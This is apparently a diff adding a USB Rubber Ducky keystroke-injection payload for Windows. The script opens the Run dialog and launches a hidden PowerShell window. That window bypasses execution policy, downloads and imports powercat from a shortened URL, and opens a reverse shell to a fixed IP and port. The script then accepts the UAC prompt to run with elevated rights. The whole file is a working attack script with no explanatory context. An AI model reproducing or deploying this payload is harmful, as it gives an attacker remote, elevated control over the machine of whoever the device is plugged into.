@@ -1,0 +1,9 @@
+#USB Rubber Ducky
+
+DELAY 5500
+GUI r
+DELAY 700
+STRING powershell /w 1 /C $a=$env:TEMP;Set-ExecutionPolicy Bypass;wget https://cutt.ly/cW13i -o $a\d.ps1;ipmo $a\d.ps1;powercat -c 192.168.0.208 -p 1234 -e powershell
+CTRL-SHIFT ENTER
+DELAY 850
+ALT y
